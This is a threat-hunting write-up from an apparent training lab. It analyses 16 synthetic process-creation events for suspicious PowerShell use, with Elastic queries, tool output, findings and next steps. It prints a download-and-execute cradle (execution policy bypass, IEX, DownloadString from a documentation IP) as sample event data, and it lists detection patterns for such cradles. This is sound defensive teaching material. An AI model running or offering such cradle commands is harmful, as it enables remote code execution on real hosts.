# H001: Suspicious PowerShell process creation

| | |
|---|---|
| **Hunt ID** | H001 |
| **Status** | Complete: findings documented, nothing confirmed as malicious |
| **Data** | `data/synthetic/process_creation_events.json` (16 synthetic events, 2026-01-15 08:01–09:05 UTC) |
| **Labels used?** | **No.** The hunt reads the events file only (see [Scope](#4-scope-and-assumptions)) |
| **Queries** | KQL and ES\|QL, in [§6](#6-investigation) |
| **Local tool** | `python -m threathunt_lab hunt` ([`hunt.py`](../src/threathunt_lab/hunt.py)) |
| **ATT&CK context** | T1059.001, T1027.010, T1105, T1204.002, T1036.003 (context only; see [§2](#2-why-this-matters)) |

## 1. Hypothesis

> Adversaries may start PowerShell with command lines that **hide the code
> being run** (encoded commands) or that **download content and run it in
> memory**, and they often start it from **unusual parent processes**, such as
> Office applications or script launchers. If that happened here, process-creation
> telemetry would show PowerShell, or a renamed copy of it, with encoding,
> hidden-window or download-cradle arguments, often with an uncommon parent.

The hypothesis can be tested with the data available. It names the telemetry
(process creation), the fields (`process.*`, `process.parent.*`) and the
observable signs. It does **not** assume that every such event is malicious.
Administrators and management tools use the same features.

## 2. Why this matters

PowerShell is installed on every modern Windows system and can download and run
code without writing a file to disk. That makes it a common tool for attackers
after initial access. The following ATT&CK techniques describe the behaviours this
hunt looks for. They are **context, not a formal mapping**. Mapping the detection
is part of Milestone 3.

| Technique | Why it is relevant |
|---|---|
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) Command and Scripting Interpreter: PowerShell | The activity being hunted |
| [T1027.010](https://attack.mitre.org/techniques/T1027/010/) Obfuscated Files or Information: Command Obfuscation | Base64 `-EncodedCommand` hides the script from a casual reader |
| [T1105](https://attack.mitre.org/techniques/T1105/) Ingress Tool Transfer | `Net.WebClient.DownloadString` pulls content from a remote host |
| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) User Execution: Malicious File | An Office document that starts PowerShell suggests the user opened a file with active content |
| [T1036.003](https://attack.mitre.org/techniques/T1036/003/) Masquerading: Rename Legitimate Utilities | A renamed copy of PowerShell avoids hunts that only look at the process name |

## 3. Telemetry and fields

**Event type:** process creation (`event.category: process`, `event.type: start`).

In a real environment these fields would usually come from one of:

| Source | Notes |
|---|---|
| Sysmon Event ID 1 (Process Create) | Has the image path, command line, parent image and parent command line. Also has `OriginalFileName` from the PE header, which this dataset does not model. |
| Windows Security Event ID 4688 | Command lines are logged only if the "Include command line in process creation events" policy is enabled. There is no parent command line. |
| Elastic Defend (endpoint) | Writes ECS fields natively, including `process.pe.original_file_name` and `process.entity_id`. |

| Field | Used for |
|---|---|
| `process.name` | Find PowerShell (Q2). Only as reliable as the file name: it can be renamed (Q5). |
| `process.executable` | Find binaries running from unusual folders (Q5). |
| `process.command_line` | Encoding, hidden window, download cradle (Q4); Base64 content (Q6). |
| `process.parent.name`, `process.parent.command_line` | Who started PowerShell and with what file (Q3). |
| `host.name`, `user.name`, `@timestamp` | Scope, stacking and timelines (Q1, Q7). |

ECS mapping details (from the ECS reference): `process.name`, `process.executable`
and `process.parent.name` are `keyword` fields, and `process.command_line` is a
`wildcard` field. KQL matches both types **case-sensitively**, which affects
several queries below.

## 4. Scope and assumptions

- **In scope:** every process-start event in the sample dataset.
- **Labels are not used.** A hunter has no answer key, so the `hunt` command
  loads events with `load_events()` and never opens
  `process_creation_labels.json`. A test (`test_hunt_runs_without_the_labels_file`)
  runs the hunt in a folder where the labels file does not exist.
- **Command lines are inert text.** They are searched, stacked and decoded,
  never run. The local tool escapes non-printable characters before printing.
- **Assessments are hypotheses.** "Needs follow-up" means a question remains
  unanswered, not that an attack happened.

## 5. How to reproduce

### Locally (no Elastic needed)

```bash
.venv/bin/python -m threathunt_lab hunt               # all steps
.venv/bin/python -m threathunt_lab hunt --step Q4     # one step (repeatable)
```

Every block marked **Observed output** below is copied from this command. A
test (`test_write_up_quotes_real_hunt_output`) re-runs the hunt and fails
if any quoted block no longer matches.

### In Elastic

Each step in §6 gives its Elastic query, named after the step (for example
`q2_powershell_starts.kql`). Run KQL queries in Kibana Discover or Timeline,
and ES|QL queries in Discover's ES|QL mode.

> **These queries have not been run against an Elastic cluster.** Their syntax
> was checked against the Elastic documentation, but this project has no
> cluster yet. Things to check before use:
>
> - **Index pattern.** `logs-*` is a placeholder. Use the pattern that holds
>   your process events, for example `logs-endpoint.events.process-*` for
>   Elastic Defend.
> - **ES|QL match operator `:`.** This is used for `event.category` and
>   `event.type` because they are arrays in ECS, and `==` on a multivalued field
>   returns `null`. The `:` operator is generally available from Elastic Stack
>   9.1 (technical preview in 9.0).
> - **`LIKE` with a list of patterns** (Q4, Q5a) needs a recent release. On older
>   versions, combine several `LIKE` clauses with `OR` instead.
> - **`RLIKE`** (Q6) uses Lucene regular expressions, which must match the
>   **whole** value. That is why the pattern starts and ends with `.*`.

## 6. Investigation

### Q1: Baseline (know the data)

**Purpose.** Before looking for anything unusual, learn what is normal: how much
data there is, over what time, from which hosts, and which programs run.

**Elastic (ES|QL).** `q1a_events_per_host.esql`:

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| STATS events = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY host.name
| SORT events ASC, host.name ASC
```

`q1b_process_names.esql`:

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| STATS events = COUNT(*) BY process.name
| SORT events ASC, process.name ASC
```

**Local:** `python -m threathunt_lab hunt --step Q1`

**Observed output:**

```text
-- Dataset summary
metric                 value
---------------------  ------------------------
events                 16
first @timestamp       2026-01-15T08:01:12.000Z
last @timestamp        2026-01-15T09:05:20.000Z
distinct host.name     4
distinct user.name     6
distinct process.name  9
```

```text
-- Process names (rarest first)
process.name        count
------------------  -----
POWERSHELL.EXE      1
ipconfig.exe        1
msedge.exe          1
notepad.exe         1
powershell_ise.exe  1
pwsh.exe            1
svchost.exe         1
svcupdate.exe       1
powershell.exe      8
```

**Analyst notes.**
- 16 events from 4 hosts (4 each) over about an hour. The sample is far too
  small to separate "rare" from "normal" statistically. In real data, a baseline
  would cover days or weeks.
- `POWERSHELL.EXE` and `powershell.exe` are listed separately. Stacking is
  case-sensitive, and that difference turns out to matter in Q2 and Q4.
- `svcupdate.exe` is an unfamiliar name. Noted for Q5.

### Q2: PowerShell process starts

**Purpose.** Find every PowerShell host process: Windows PowerShell, PowerShell 7
(`pwsh.exe`) and the ISE.

**Elastic (KQL).** `q2_powershell_starts.kql`:

```kql
event.category : "process" and event.type : "start" and process.name : ("powershell.exe" or "pwsh.exe" or "powershell_ise.exe" or "POWERSHELL.EXE" or "PWSH.EXE" or "POWERSHELL_ISE.EXE")
```

KQL compares `keyword` values exactly, **including case**. Listing upper- and
lower-case spellings covers the common forms but still misses mixed case such
as `PowerShell.exe`. ES|QL can lower-case the value first, which covers every
spelling. `q2_powershell_starts.esql`:

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE TO_LOWER(process.name) IN ("powershell.exe", "pwsh.exe", "powershell_ise.exe")
| KEEP @timestamp, event.id, host.name, user.name, process.name
| SORT @timestamp ASC
```

**Local:** `python -m threathunt_lab hunt --step Q2`

**Observed output:**

```text
-- Exact-case vs case-insensitive name match
match                                                            events
---------------------------------------------------------------  ------
exact case, lower-case names only (like KQL on a keyword field)  10
case-insensitive                                                 11
```

```text
-- PowerShell process starts
@timestamp                event.id      host.name   user.name       process.name
------------------------  ------------  ----------  --------------  ------------------
2026-01-15T08:10:30.000Z  thl-evt-0004  WKS-ENG-02  user.eng02      powershell.exe
2026-01-15T08:12:02.000Z  thl-evt-0005  WKS-ENG-02  user.eng02      powershell.exe
2026-01-15T08:15:00.000Z  thl-evt-0006  SRV-APP-01  svc_monitoring  powershell.exe
2026-01-15T08:22:40.000Z  thl-evt-0008  WKS-HR-03   user.hr03       powershell.exe
2026-01-15T08:30:05.000Z  thl-evt-0009  WKS-FIN-01  user.fin01      powershell.exe
2026-01-15T08:31:10.000Z  thl-evt-0010  WKS-HR-03   user.hr03       powershell.exe
2026-01-15T08:40:00.000Z  thl-evt-0011  SRV-APP-01  svc_deploy      powershell.exe
2026-01-15T08:45:30.000Z  thl-evt-0012  WKS-ENG-02  user.eng02      POWERSHELL.EXE
2026-01-15T08:50:12.000Z  thl-evt-0013  WKS-FIN-01  user.fin01      pwsh.exe
2026-01-15T08:55:00.000Z  thl-evt-0014  WKS-HR-03   user.hr03       powershell_ise.exe
2026-01-15T09:00:00.000Z  thl-evt-0015  SRV-APP-01  SYSTEM          powershell.exe
```

**Analyst notes.**
- 11 of the 16 events are PowerShell starts, on all 4 hosts and under 6
  accounts. Using PowerShell is normal here, so it is not a finding by itself.
- An exact, lower-case-only match finds 10. It misses `thl-evt-0012`
  (`POWERSHELL.EXE`). **Lesson: always check the case-sensitivity of the
  fields you query.**
- Q2 depends on the file name. A renamed copy of PowerShell would not appear,
  and Q5 deals with that gap.

### Q3: Parent process stacking

**Purpose.** Count which processes started PowerShell. Common parents (Explorer,
the Task Scheduler's `svchost.exe`) are expected. Rare parents (the "long tail")
deserve a closer look.

**Elastic (ES|QL).** `q3_parent_stacking.esql`:

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE TO_LOWER(process.name) IN ("powershell.exe", "pwsh.exe", "powershell_ise.exe")
| STATS events = COUNT(*) BY process.parent.name
| SORT events ASC, process.parent.name ASC
```

KQL can only filter. It cannot count or group, so stacking needs ES|QL or a
Kibana visualisation.

**Local:** `python -m threathunt_lab hunt --step Q3`

**Observed output:**

```text
-- PowerShell parents (rarest first)
process.parent.name  count
-------------------  -----
Code.exe             1
EXCEL.EXE            1
WINWORD.EXE          1
deployagent.exe      1
cmd.exe              2
svchost.exe          2
explorer.exe         3
```

```text
-- Parent command lines of PowerShell starts
event.id      process.parent.name  process.parent.command_line
------------  -------------------  ------------------------------------------------------------------------------------------------------------------
thl-evt-0004  explorer.exe         C:\Windows\Explorer.EXE
thl-evt-0005  Code.exe             "C:\Users\user.eng02\AppData\Local\Programs\Microsoft VS Code\Code.exe"
thl-evt-0006  svchost.exe          C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
thl-evt-0008  explorer.exe         C:\Windows\Explorer.EXE
thl-evt-0009  WINWORD.EXE          "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\user.fin01\Downloads\invoice_0423.docm"
thl-evt-0010  cmd.exe              C:\Windows\system32\cmd.exe /c "C:\Users\user.hr03\AppData\Local\Temp\start.bat"
thl-evt-0011  deployagent.exe      "C:\Program Files\ExampleCorp\DeployAgent\deployagent.exe" --run-job 1187
thl-evt-0012  cmd.exe              C:\Windows\system32\cmd.exe
thl-evt-0013  EXCEL.EXE            "C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" /dde
thl-evt-0014  explorer.exe         C:\Windows\Explorer.EXE
thl-evt-0015  svchost.exe          C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
```

**Analyst notes.**
- **`WINWORD.EXE → PowerShell` (`thl-evt-0009`).** Word opened
  `invoice_0423.docm` from `Downloads`. `.docm` is a macro-enabled document,
  and an "invoice" downloaded from outside is a common lure. Word rarely needs
  to start PowerShell. **Follow up.**
- **`EXCEL.EXE /dde → pwsh.exe` (`thl-evt-0013`).** Excel was started with
  `/dde`, which is normal when a user opens a spreadsheet from Explorer.
  Excel starting PowerShell 7 is still unusual. **Follow up**, together with
  `thl-evt-0009` (same user and host).
- **`cmd.exe /c …\AppData\Local\Temp\start.bat` (`thl-evt-0010`).** A batch
  file in the user's temp folder started PowerShell. Installers do this too,
  so the parent alone proves little, but Q4 shows what it ran.
- **`deployagent.exe --run-job 1187` (`thl-evt-0011`).** A management agent
  under `Program Files`, running as `svc_deploy`. This could be ordinary
  automation. Q4 and Q6 add context.
- Code.exe (VS Code's terminal), Explorer and Task Scheduler (`svchost.exe -s
  Schedule`) are expected parents.

### Q4: Command-line features

**Purpose.** Look in PowerShell command lines for the features named in the
hypothesis: encoding, hidden windows, policy bypass, download cradles and
in-memory execution (`IEX`). `-NoProfile` is included for context.

**Elastic (ES|QL).** `q4_command_line_features.esql`:

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE TO_LOWER(process.name) IN ("powershell.exe", "pwsh.exe", "powershell_ise.exe")
| EVAL cmd = TO_LOWER(process.command_line)
| EVAL encoded_command = cmd LIKE "*-enc*",
       hidden_window = cmd LIKE "*hidden*",
       no_profile = cmd LIKE "*-nop*",
       policy_bypass = cmd LIKE "*bypass*",
       download = cmd LIKE ("*downloadstring*", "*downloadfile*", "*net.webclient*", "*invoke-webrequest*", "*start-bitstransfer*"),
       invoke_expression = cmd LIKE ("*iex*", "*invoke-expression*")
| KEEP @timestamp, event.id, host.name, process.parent.name, encoded_command, hidden_window, no_profile, policy_bypass, download, invoke_expression, process.command_line
| SORT @timestamp ASC
```

A plain KQL version, for comparison: `q4_encoded_command_naive.kql`:

```kql
event.category : "process" and event.type : "start" and process.name : ("powershell.exe" or "pwsh.exe" or "POWERSHELL.EXE") and process.command_line : (*-enc* or *-Enc* or *-ENC* or *-EncodedCommand*)
```

**Local:** `python -m threathunt_lab hunt --step Q4`

**Observed output:**

```text
-- Feature counts across PowerShell starts
feature            searched for                                                                            events  event.id values
-----------------  --------------------------------------------------------------------------------------  ------  ----------------------------------------------------------------------------------
encoded_command    -enc                                                                                    5       thl-evt-0008, thl-evt-0009, thl-evt-0011, thl-evt-0012, thl-evt-0013
hidden_window      hidden                                                                                  3       thl-evt-0009, thl-evt-0012, thl-evt-0015
no_profile         -nop                                                                                    6       thl-evt-0006, thl-evt-0008, thl-evt-0009, thl-evt-0011, thl-evt-0012, thl-evt-0015
policy_bypass      bypass                                                                                  1       thl-evt-0010
download           downloadstring | downloadfile | net.webclient | invoke-webrequest | start-bitstransfer  1       thl-evt-0010
invoke_expression  iex | invoke-expression                                                                 1       thl-evt-0010
```

```text
-- Command lines for manual review
event.id      process.command_line
------------  -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
thl-evt-0004  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
thl-evt-0005  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo
thl-evt-0006  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File "C:\Scripts\Get-DiskReport.ps1"
thl-evt-0008  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "Get-Content C:\Reports\q4-encryption-audit.txt"
thl-evt-0009  powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQAaAByAGUAYQB0AEgAdQBuAHQAIABMAGEAYgAgAHMAeQBuAHQAaABlAHQAaQBjACAAZQB2AGUAbgB0ACAALQAgAGkAbgBlAHIAdAAnAA==
thl-evt-0010  powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')"
thl-evt-0011  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQAaAByAGUAYQB0AEgAdQBuAHQAIABMAGEAYgAgAHMAeQBuAHQAaABlAHQAaQBjACAAYQBkAG0AaQBuACAAdABhAHMAawAgAC0AIABpAG4AZQByAHQAJwA=
thl-evt-0012  POWERSHELL.EXE -NoP -W Hidden -eNc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==
thl-evt-0013  "C:\Program Files\PowerShell\7\pwsh.exe" -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQAaAByAGUAYQB0AEgAdQBuAHQAIABMAGEAYgAgAHMAeQBuAHQAaABlAHQAaQBjACAAcAB3AHMAaAAgAGUAdgBlAG4AdAAgAC0AIABpAG4AZQByAHQAJwA=
thl-evt-0014  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe"
thl-evt-0015  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle Hidden -File C:\Scripts\Rotate-Logs.ps1
```

```text
-- Encoded-command search: case-sensitive KQL (q4_encoded_command_naive.kql) vs case-insensitive
event.id      KQL match  case-insensitive match
------------  ---------  ----------------------
thl-evt-0008  yes        yes
thl-evt-0009  yes        yes
thl-evt-0011  yes        yes
thl-evt-0012  NO         yes
thl-evt-0013  yes        yes
```

**Analyst notes.** Each command line was read by hand. Feature counts are only
pointers.
- **`thl-evt-0008` is a false match.** `-enc` appears inside the file name
  `q4-encryption-audit.txt`. The command just reads a text file. **Lesson:**
  substring searches cannot tell a parameter from text inside an argument.
  A detection has to match whole parameters (Milestone 3).
- **`thl-evt-0012` is missed by the KQL query.** `-eNc` uses mixed case, and
  none of the listed spellings match it. PowerShell accepts parameter names in
  any case and in shortened form (`-enc` for `-EncodedCommand`), so trying to
  list every spelling in KQL does not work. In this run, the KQL query had
  **one false match (0008) and one miss (0012)** among 5 candidates.
- **`thl-evt-0010`** is a classic download cradle: execution policy bypass,
  `New-Object Net.WebClient`, `DownloadString` from a bare IP address, piped
  into `IEX`. Whatever `update.ps1` contained ran in memory and is **not
  visible** in process telemetry. `198.51.100.23` is an RFC 5737
  documentation address. In real data, the next step would be to check its
  reputation and search network logs for it. **Follow up.**
- **`thl-evt-0009` and `thl-evt-0012`** combine `-nop`, a hidden window and an
  encoded command. Together these try to stay out of sight of the user.
  **Follow up.**
- **`-NoProfile` (6 events) is weak on its own.** It is standard practice in
  automation (`thl-evt-0006`, `0011`, `0015`).
- **`thl-evt-0015` uses a hidden window,** but the parent is the Task Scheduler,
  it runs as `SYSTEM`, and it runs a named script on disk
  (`C:\Scripts\Rotate-Logs.ps1`) that can be reviewed. Likely benign.

### Q5: Beyond the process name

**Purpose.** Q2–Q4 depend on `process.name`. Q5 looks for PowerShell-style
arguments on processes **not** named PowerShell, and counts the folders that
executables run from.

**Elastic (ES|QL).** `q5a_powershell_arguments_elsewhere.esql`:

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE TO_LOWER(process.name) NOT IN ("powershell.exe", "pwsh.exe", "powershell_ise.exe")
| EVAL cmd = TO_LOWER(process.command_line)
| WHERE cmd LIKE ("*-enc*", "*hidden*", "*-nop*", "*bypass*", "*downloadstring*", "*downloadfile*", "*net.webclient*", "*invoke-webrequest*", "*start-bitstransfer*", "*iex*", "*invoke-expression*")
| KEEP @timestamp, event.id, host.name, process.name, process.executable, process.command_line
```

`q5b_executable_directories.esql` strips the file name from the path with a
regular expression (a backslash followed by anything that is not a backslash,
up to the end):

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| EVAL directory = REPLACE(TO_LOWER(process.executable), """\\[^\\]*$""", "")
| STATS events = COUNT(*) BY directory
| SORT events ASC, directory ASC
```

**Local:** `python -m threathunt_lab hunt --step Q5`

**Observed output:**

```text
-- Non-PowerShell processes with PowerShell-style arguments
event.id      host.name  process.name   process.executable             features
------------  ---------  -------------  -----------------------------  ------------------------------------------
thl-evt-0016  WKS-HR-03  svcupdate.exe  C:\Users\Public\svcupdate.exe  encoded_command, hidden_window, no_profile
```

```text
-- Executable directories, all events (rarest first)
directory                                          count
-------------------------------------------------  -----
c:\program files (x86)\microsoft\edge\application  1
c:\program files\powershell\7                      1
c:\users\public                                    1
c:\windows\system32                                3
c:\windows\system32\windowspowershell\v1.0         10
```

**Analyst notes.**
- **`thl-evt-0016`.** `svcupdate.exe` runs from `C:\Users\Public`, a folder
  every user can write to, so programs rarely run from it. Its command line
  (`-nop -w hidden -enc …`) has exactly the syntax `powershell.exe` accepts.
  The name sounds like a Windows service updater, but no such Windows binary
  exists in that folder. **The most likely explanation is a renamed copy of
  PowerShell**, but this cannot be confirmed: the dataset has no
  `process.pe.original_file_name` and no file hash. **Follow up.**
- Q2–Q4 missed this event entirely. **Lesson:** process names are chosen by
  whoever wrote the file to disk, so a hunt keyed only on the name can be
  evaded by renaming the binary.
- `c:\users\public` is also one of the rarest folders in the directory stack.

### Q6: Decode encoded commands

**Purpose.** Read what the encoded commands contain. PowerShell's
`-EncodedCommand` takes **Base64 of UTF-16LE text**.

**Elastic (ES|QL).** `q6_base64_candidates.esql` finds command lines that
contain a long Base64 run:

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE process.command_line RLIKE """.*[A-Za-z0-9+/]{20,}={0,2}.*"""
| KEEP @timestamp, event.id, host.name, process.name, process.command_line
```

ES|QL has a `FROM_BASE64` function, but it produces a UTF-8 string, while these
payloads are UTF-16LE. The decoding is therefore done locally (or in a tool such
as CyberChef), **as text only, on an analysis machine, and never piped into
PowerShell**.

**Local:** `python -m threathunt_lab hunt --step Q6`

**Observed output:**

```text
-- Decoded Base64 candidates (text only, never executed)
event.id      process.name    blob length  decoded text
------------  --------------  -----------  ----------------------------------------------------------
thl-evt-0009  powershell.exe  144          Write-Output 'ThreatHunt Lab synthetic event - inert'
thl-evt-0011  powershell.exe  156          Write-Output 'ThreatHunt Lab synthetic admin task - inert'
thl-evt-0012  POWERSHELL.EXE  56           Write-Output 'inert'
thl-evt-0013  pwsh.exe        156          Write-Output 'ThreatHunt Lab synthetic pwsh event - inert'
thl-evt-0016  svcupdate.exe   56           Write-Output 'inert'
```

**Analyst notes.**
- All five encoded blobs decode to harmless `Write-Output` statements. This is
  expected, because the dataset was built to be inert.
- **Benign content does not clear the event.** In a real hunt, the question
  for `thl-evt-0009` would still be *why a downloaded macro document started
  hidden PowerShell*. Test runs and staged attacks both use harmless payloads,
  and the decoded text says nothing about what happened next.
- The blob in `thl-evt-0016` decodes as PowerShell encoding. That supports, but
  does not prove, the renamed-PowerShell explanation from Q5.
- `thl-evt-0010` has no encoded blob. Its command is in plain text.

### Q7: Host timelines

**Purpose.** Put each host's events in time order. Single events become a
sequence, and related activity on the same host becomes visible.

**Elastic.** Shown for `WKS-HR-03`. Change `host.name` for other hosts.
`q7_host_timeline.kql` (sort by `@timestamp` in Discover):

```kql
host.name : "WKS-HR-03" and event.category : "process" and event.type : "start"
```

`q7_host_timeline.esql`:

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start" AND host.name == "WKS-HR-03"
| KEEP @timestamp, event.id, user.name, process.parent.name, process.name, process.command_line
| SORT @timestamp ASC
```

**Local:** `python -m threathunt_lab hunt --step Q7`

**Observed output:**

```text
-- Timeline for WKS-FIN-01
@timestamp                event.id      user.name   parent -> process              features
------------------------  ------------  ----------  -----------------------------  ------------------------------------------
2026-01-15T08:01:12.000Z  thl-evt-0001  user.fin01  explorer.exe -> notepad.exe    -
2026-01-15T08:03:45.000Z  thl-evt-0002  user.fin01  explorer.exe -> msedge.exe     -
2026-01-15T08:30:05.000Z  thl-evt-0009  user.fin01  WINWORD.EXE -> powershell.exe  encoded_command, hidden_window, no_profile
2026-01-15T08:50:12.000Z  thl-evt-0013  user.fin01  EXCEL.EXE -> pwsh.exe          encoded_command
```

```text
-- Timeline for WKS-HR-03
@timestamp                event.id      user.name  parent -> process                   features
------------------------  ------------  ---------  ----------------------------------  ------------------------------------------
2026-01-15T08:22:40.000Z  thl-evt-0008  user.hr03  explorer.exe -> powershell.exe      encoded_command, no_profile
2026-01-15T08:31:10.000Z  thl-evt-0010  user.hr03  cmd.exe -> powershell.exe           policy_bypass, download, invoke_expression
2026-01-15T08:55:00.000Z  thl-evt-0014  user.hr03  explorer.exe -> powershell_ise.exe  -
2026-01-15T09:05:20.000Z  thl-evt-0016  user.hr03  cmd.exe -> svcupdate.exe            encoded_command, hidden_window, no_profile
```

```text
-- Timeline for SRV-APP-01
@timestamp                event.id      user.name       parent -> process                  features
------------------------  ------------  --------------  ---------------------------------  ---------------------------
2026-01-15T08:05:00.000Z  thl-evt-0003  SYSTEM          services.exe -> svchost.exe        -
2026-01-15T08:15:00.000Z  thl-evt-0006  svc_monitoring  svchost.exe -> powershell.exe      no_profile
2026-01-15T08:40:00.000Z  thl-evt-0011  svc_deploy      deployagent.exe -> powershell.exe  encoded_command, no_profile
2026-01-15T09:00:00.000Z  thl-evt-0015  SYSTEM          svchost.exe -> powershell.exe      hidden_window, no_profile
```

(The `WKS-ENG-02` timeline is in the full output.)

**Analyst notes.**
- **WKS-FIN-01:** two Office applications start encoded PowerShell 20 minutes
  apart, under the same user. One unusual event is easier to explain away
  than two.
- **WKS-HR-03:** a download cradle at 08:31, then a likely renamed PowerShell
  binary started from `cmd.exe` at 09:05. The order fits "download, then
  follow-on activity", **but it cannot be shown that the events are linked.**
  The two `cmd.exe` parents may be the same process or different ones, and
  without `process.pid` / `process.entity_id` the process tree cannot be
  rebuilt. The `0008` "encoded_command" flag here is the false match from Q4.
- **SRV-APP-01:** every PowerShell start has a service or scheduler parent, a
  service account or `SYSTEM`, and in two cases a named script on disk. This
  pattern looks like automation.

## 7. Findings

| Event | Host | What was observed | Assessment |
|---|---|---|---|
| `thl-evt-0009` | WKS-FIN-01 | Word, opening a downloaded `.docm`, starts hidden PowerShell with an encoded command | **Needs follow-up** |
| `thl-evt-0013` | WKS-FIN-01 | Excel starts PowerShell 7 with an encoded command, 20 min after 0009 | **Needs follow-up** |
| `thl-evt-0010` | WKS-HR-03 | Temp-folder batch file starts PowerShell: execution policy bypass + `DownloadString` from an IP + `IEX` | **Needs follow-up** |
| `thl-evt-0016` | WKS-HR-03 | `svcupdate.exe` in `C:\Users\Public` with PowerShell-style hidden + encoded arguments; probably renamed PowerShell | **Needs follow-up** |
| `thl-evt-0012` | WKS-ENG-02 | Interactive `cmd.exe` starts PowerShell with hidden + encoded command (mixed case `-eNc`) | **Needs follow-up** (lower priority; see §8) |
| `thl-evt-0011` | SRV-APP-01 | Deployment agent runs PowerShell with `-EncodedCommand` as `svc_deploy` | **Benign explanation available**: confirm with the agent's owners |
| `thl-evt-0015` | SRV-APP-01 | Scheduled task runs on-disk script with hidden window as `SYSTEM` | **Benign explanation available** |
| `thl-evt-0006` | SRV-APP-01 | Scheduled task runs on-disk reporting script | Likely benign |
| `thl-evt-0008` | WKS-HR-03 | `-enc` matched only inside a file name | Likely benign (false match from substring search) |
| `thl-evt-0004`, `0005`, `0014` | WKS-ENG-02, WKS-HR-03 | Interactive PowerShell / VS Code terminal / ISE, no flagged features | Likely benign |

None of these assessments is a verdict. "Needs follow-up" means the
telemetry raises a question that it cannot answer by itself.

## 8. Benign explanations considered

- **Management and deployment tools** (`thl-evt-0011`). Some tools pass scripts
  with `-EncodedCommand` to avoid problems with quoting. The parent runs from
  `Program Files`, the account is a service account, and the job ID can be
  checked. Before treating it as benign: ask the tool's owners whether job 1187
  exists and what it runs. If any exclusion is added later, keep it narrow
  (parent executable path + account), not "ignore encoded commands".
- **Scheduled maintenance with a hidden window** (`thl-evt-0015`). Hidden windows
  stop console pop-ups in automation. The script is on disk and can be reviewed.
- **Engineers testing scripts** (`thl-evt-0012`). Engineers do run encoded
  commands while developing or testing. That makes this a lower priority than
  the Office and download events, but the hidden window is still unexplained.
  Asking the user is a reasonable first step.
- **Office add-ins and DDE** (`thl-evt-0009`, `0013`). Some legitimate add-ins
  start helper processes. That does not explain a hidden, encoded PowerShell
  started from a downloaded macro document, so the follow-up stands.
- **Downloaded installers** (`thl-evt-0010`). Installers and update scripts
  sometimes use `DownloadString`. A bare IP address, a temp-folder batch file and
  `IEX` together are less typical, but the content of `update.ps1` is unknown.

## 9. Limitations

- **Synthetic and tiny.** 16 hand-written events, built to contain these
  scenarios. "Rare" in this data means nothing statistically, and nothing here
  shows how common this activity is in real networks.
- **Only process starts.** There are no script-block logs (Event ID 4104), so
  what `IEX` actually ran is invisible. There are no network events (was
  `198.51.100.23` reached?) and no file events (who wrote `svcupdate.exe`?).
- **No process tree.** Without `process.pid`, `process.entity_id` or
  `process.parent.executable`, events cannot be reliably linked to each other.
- **No PE metadata or hashes.** A renamed PowerShell binary cannot be confirmed.
- **Simple string matching.** The features in Q4 and Q5 are case-insensitive
  substrings, so they have the weaknesses described in Q4. Obfuscation
  (string concatenation, backticks, alternative cmdlets) would get past them.
- **Elastic queries not executed** (see §5).
- **Labels not used.** This was intentional. Whether the hunt's assessments
  agree with the scenario labels is checked in Milestone 4, not here.

## 10. Conclusions

**The hypothesis is supported by the observed telemetry, but no activity is
confirmed malicious.**

- On **WKS-FIN-01** and **WKS-HR-03**, process-creation events match the
  behaviour described in the hypothesis: Office applications starting encoded
  PowerShell, a download-and-execute command, and a probably renamed PowerShell
  binary in a world-writable folder. No benign explanation was found for these
  in the available data.
- On **WKS-ENG-02**, one hidden, encoded PowerShell start from an interactive
  shell is unexplained, but an engineer testing is plausible.
- On **SRV-APP-01**, encoded and hidden PowerShell use is consistent with
  automation that can be checked.

In a real environment, the next steps would be to:

1. Escalate WKS-FIN-01 and WKS-HR-03 for triage.
2. Collect script-block logs, network connections (in particular to
   `198.51.100.23`), `invoice_0423.docm`, `start.bat`, and the hash and PE
   metadata of `svcupdate.exe`.
3. Ask the user of WKS-ENG-02 about `thl-evt-0012`.
4. Confirm deployment job 1187 with the owners of the deployment agent.

## 11. Hand-off to Milestone 3 (detection engineering)

What this hunt suggests for a narrow, automated detection:

1. **Main signal: an encoded-command parameter on a PowerShell host process.**
   It was present in every unexplained PowerShell event except the download
   cradle.
2. **Match parameters as whole tokens, not substrings.** Avoid the
   `q4-encryption` false match (`thl-evt-0008`).
3. **Ignore case and accept shortened parameter names** (`-eNc`, `-enc`,
   `-EncodedCommand`; the full set PowerShell accepts must be checked).
   Avoid the KQL miss (`thl-evt-0012`).
